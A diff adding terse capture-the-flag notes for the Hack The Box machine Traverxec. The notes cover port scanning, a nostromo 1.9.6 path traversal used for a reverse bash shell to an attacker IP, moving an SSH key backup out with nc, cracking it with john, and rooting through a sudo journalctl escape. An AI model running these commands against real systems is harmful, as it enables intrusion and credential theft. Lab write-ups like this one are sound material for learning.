@@ -1,0 +1,134 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.165
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.165
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
+80/tcp open  http    nostromo 1.9.6
+|_http-title: TRAVERXEC
+|_http-server-header: nostromo 1.9.6
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|specialized|storage-misc
+Running (JUST GUESSING): Linux 3.X|4.X|5.X (90%), Crestron 2-Series (86%), HP embedded (85%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
+Aggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%), Linux 5.1 (88%), Crestron XPanel control system (86%), Linux 3.16 (86%), HP P2000 G3 NAS device (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.165/
+take attention:
+80/tcp open  http    nostromo 1.9.6
+
+command: nc -lvnp 7979
+command: curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.3/7979 0>&1"'
+
+command: id && whoami
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+
+let's upload LinEnum.sh and run it:
+take attention: 
+[-] htpasswd found - could contain passwords:
+/var/nostromo/conf/.htpasswd
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+command: cd /var/nostromo/conf
+command: cat nhttpd.conf
+# MAIN [MANDATORY]
+
+servername              traverxec.htb
+serverlisten            *
+serveradmin             david@traverxec.htb
+serverroot              /var/nostromo
+servermimes             conf/mimes
+docroot                 /var/nostromo/htdocs
+docindex                index.html
+
+# LOGS [OPTIONAL]
+
+logpid                  logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user                    www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess                .htaccess
+htpasswd                /var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons                  /var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs                /home
+homedirs_public         public_www
+
+access: http://10.10.10.165/~david/
+
+command: cd /home/david/public_www/protected-file-area
+command: ls -al
+drwxr-xr-x 2 david david 4096 Oct 25  2019 .
+drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
+-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
+-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
+
+let's download backup-ssh-identity-files.tgz
+kali-host>nc -lvnp 7979 > backup-identity-files.tgz.b64
+target> cat backup-ssh-identity-files.tgz | nc 10.10.16.3 7979
+
+command: tar -zxvf backup-identity-files.tgz.b64
+command: ssh2john id_rsa > id_rsa.john
+command: john id_rsa.john --wordlist=/home/donika/Documents/hackthebox/26_postman_easy/rockyou.txt
+command: john id_rsa.john --show
+id_rsa:hunter
+
+command: ssh -i id_rsa david@10.10.10.165
+password: hunter
+
+command: cd ~/bin
+command: ls -al
+total 16
+drwx------ 2 david david 4096 Oct 25  2019 .
+drwx--x--x 5 david david 4096 Oct 25  2019 ..
+-r-------- 1 david david  802 Oct 25  2019 server-stats.head
+-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
+
+command: cat server-stats.sh 
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+
+exploit on journalctl 
+read: 
+https://gtfobins.github.io/gtfobins/journalctl/#sudo
+
+command: /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+type: enter
+type: !/bin/bash then enter
+
+command: cd /root
+command: cat root.txt
+f861f8f7eb7cf7d29d51276664541599
+
+resource:
+https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html#priv-david--root
